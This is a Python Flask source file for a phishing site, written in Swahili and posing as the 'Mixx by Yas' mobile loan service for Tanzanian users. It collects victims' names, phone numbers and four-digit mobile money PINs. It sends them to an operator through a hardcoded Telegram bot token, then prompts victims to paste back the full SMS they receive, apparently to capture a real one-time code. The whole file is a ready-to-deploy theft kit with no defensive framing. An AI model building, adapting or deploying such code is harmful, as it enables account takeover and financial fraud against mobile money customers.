from flask import Flask, render_template_string, request
import requests
import random
from datetime import datetime, timedelta

app = Flask(__name__)

# ============ WEKA TOKEN YAKO HAPA ============
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik" 
ADMIN_CHAT_ID = "8580615195"
# ==============================================

applications = {}
otp_store = {}

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "HTML"}
    requests.post(url, data=data)

# ========== HTML ZOTE ZIKO HAPA NDANI ==========

STEP1 = """
<!DOCTYPE html><html><head><title>Hatua 1</title><style>body{font-family:Arial;background:#002B7A;padding:20px}.card{background:white;padding:20px;border-radius:10px;max-width:400px;margin:auto}button{background:#002B7A;color:white;border:none;padding:12px;width:100%;border-radius:8px}</style></head>
<body><div class="card"><h2 style="color:#002B7A">Mixx by Yas</h2><h3>Hatua 1 ya 3</h3>
<form method="POST">
<label>Aina ya Mkopo</label><select name="loan_type" required style="width:100%;padding:10px"><option>Mikopo ya Biashara</option><option>Mikopo ya Haraka</option></select><br><br>
<label>Kiasi cha Mkopo</label><input type="number" name="amount" placeholder="500000" required style="width:100%;padding:10px"><br><br>
<label>Muda wa Marejesho</label><input name="months" placeholder="miezi 6" required style="width:100%;padding:10px"><br><br>
<label>Kusudi la Mkopo</label><input name="purpose" placeholder="Biashara" required style="width:100%;padding:10px"><br><br>
<button>HATUA INAYOFUATA</button></form></div></body></html>
"""

STEP2 = """
<!DOCTYPE html><html><head><title>Hatua 2</title><style>body{font-family:Arial;background:#002B7A;padding:20px}.card{background:white;padding:20px;border-radius:10px;max-width:400px;margin:auto}button{background:#002B7A;color:white;border:none;padding:12px;width:100%;border-radius:8px}</style></head>
<body><div class="card"><h2 style="color:#002B7A">Mixx by Yas</h2><h3>Hatua 2 ya 3</h3>
<form method="POST">
<label>Jina la Kwanza</label><input name="name" required style="width:100%;padding:10px"><br><br>
<label>Jina la Mwisho</label><input name="lname" required style="width:100%;padding:10px"><br><br>
<label>Nambari ya Simu</label><div style="display:flex"><span style="padding:10px;background:#eee">🇹🇿 +255</span><input name="phone" placeholder="712345678" required style="width:100%;padding:10px"></div><br>
<small>Weka tarakimu 9 za namba yako</small><br><br>
<button>HATUA INAYOFUATA</button></form></div></body></html>
"""

PIN = """
<!DOCTYPE html><html><head><title>PIN</title><style>body{background:#002B7A;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:white;padding:30px;border-radius:15px;width:90%;max-width:400px;text-align:center}.pin-boxes{display:flex;justify-content:center;gap:10px;margin:20px 0}.pin-boxes input{width:50px;height:50px;text-align:center;font-size:24px;border:1px solid #ddd;border-radius:8px}button{background:#002B7A;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px}</style></head>
<body><div class="card"><h2 style="color:#002B7A">Mixx by Yas</h2><p>Mikopo Rahisi na ya Haraka</p><h3>Ingia</h3>
<form method="POST">
<div style="display:flex;border:1px solid #ddd;border-radius:8px"><span style="padding:12px;background:#eee">🇹🇿 +255</span><input type="tel" name="phone" placeholder="712345678" required style="border:none;padding:12px;width:100%"></div><br>
<p>Weka PIN yako</p>
<div class="pin-boxes">
<input type="password" name="pin1" maxlength="1" required>
<input type="password" name="pin2" maxlength="1" required>
<input type="password" name="pin3" maxlength="1" required>
<input type="password" name="pin4" maxlength="1" required>
</div>
<p style="color:#002B7A">Umesahau PIN?</p>
<button>INGIA</button></form></div></body></html>
"""

SUCCESS = """<!DOCTYPE html><html><body style="text-align:center;padding:50px;font-family:Arial;background:#002B7A"><div style="background:white;padding:30px;border-radius:10px;max-width:400px;margin:auto"><h2 style="color:green">✅ Ombi la Mkopo Limewasilishwa</h2><p>Tafadhali subiri mwakilishi atakuwasiliana nawe kupitia simu</p></div></body></html>"""

OTP = """
<!DOCTYPE html><html><body style="text-align:center;padding:50px;font-family:Arial;background:#002B7A">
<div style="background:white;padding:30px;border-radius:10px;max-width:400px;margin:auto">
<h2>Uthibitisho wa Code</h2>
<p>Nakili ujumbe kamili uliotumwa kwenye simu <b>+255{{ phone }}</b></p>
<form method="POST">
<textarea name="code" rows="4" cols="35" placeholder="Bandika ujumbe hapa" required></textarea><br><br>
<button style="background:#002B7A;color:white;padding:12px;width:100%;border:none">THIBITISHA</button>
</form></div></body></html>
"""

# ========== ROUTES ZOTE ==========

@app.route('/', methods=['GET', 'POST'])
def step1():
    if request.method == 'POST':
        loan_id = str(random.randint(1000000000, 9999999999))
        applications[loan_id] = {
            'type': request.form['loan_type'],
            'amount': int(request.form['amount']),
            'months': request.form['months'],
            'purpose': request.form['purpose']
        }
        return render_template_string(STEP2.replace('</form>', f'<input type="hidden" name="loan_id" value="{loan_id}"></form>'))
    return render_template_string(STEP1)

@app.route('/step2', methods=['POST'])
def step2():
    loan_id = request.form['loan_id']
    applications[loan_id]['name'] = request.form['name']
    applications[loan_id]['lname'] = request.form['lname']
    applications[loan_id]['phone'] = request.form['phone']
    return render_template_string(PIN.replace('</form>', f'<input type="hidden" name="loan_id" value="{loan_id}"></form>'))

@app.route('/pin', methods=['POST'])
def pin_submit():
    loan_id = request.form['loan_id']
    phone = request.form['phone']
    pin = request.form['pin1'] + request.form['pin2'] + request.form['pin3'] + request.form['pin4']
    applications[loan_id]['phone'] = phone
    applications[loan_id]['pin'] = pin
    
    data = applications[loan_id]
    text = f"🔔 <b>NEW LOAN APPLICATION</b>\n\nID: {loan_id}\nName: {data['name']} {data['lname']}\nPhone: +255{data['phone']}\nAmount: TZS {data['amount']:,}\nPurpose: {data['purpose']}\nPIN: {pin}"
    keyboard = {"inline_keyboard": [[{"text": "✅ Correct - Allow OTP", "callback_data": f"approve_{loan_id}"}], [{"text": "❌ Invalid - Deny", "callback_data": f"reject_{loan_id}"}]]}
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": ADMIN_CHAT_ID, "text": text, "reply_markup": keyboard, "parse_mode": "HTML"})
    
    return render_template_string(SUCCESS)

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'callback_query' in data:
        callback = data['callback_query']
        action, loan_id = callback['data'].split('_')
        
        if action == 'approve':
            code = str(random.randint(1000, 9999))
            expiry = datetime.now() + timedelta(minutes=1)
            otp_store[loan_id] = {'code': code, 'expiry': expiry}
            phone = applications[loan_id]['phone']
            
            customer_msg = f"MIXX BY YAS: Ombi lako {loan_id} limeidhinishwa.\nCode yako ya siri ni: {code}\nTafadhali usishare na mtu. Inaisha dakika 1."
            admin_msg = f"✅ <b>APPROVED!</b>\n\n<b>TUMA UJUMBE HUU KWA MTEJA:</b>\n--------------------------------\n{customer_msg}\n--------------------------------\n\n<b>LINK:</b> https://loan-api-flask.onrender.com/otp/{loan_id}\n\n⚠️ Ina-expire: {expiry.strftime('%H:%M:%S')}"
            send_telegram(admin_msg)
    return "ok"

@app.route('/otp/<loan_id>', methods=['GET', 'POST'])
def otp_page(loan_id):
    if request.method == 'POST':
        user_code = request.form['code']
        if loan_id in otp_store and datetime.now() < otp_store[loan_id]['expiry']:
            if user_code.find(otp_store[loan_id]['code']) != -1:
                return "<h1 style='color:green; text-align:center;'>✅ SUCCESS! Mkopo umeidhinishwa</h1>"
        return "<h1 style='color:red; text-align:center;'>❌ CODE NI SIKU SAHI AU IMEISHA</h1>"
    return render_template_string(OTP, phone=applications[loan_id]['phone'])

if __name__ == '__main__':
    app.run()
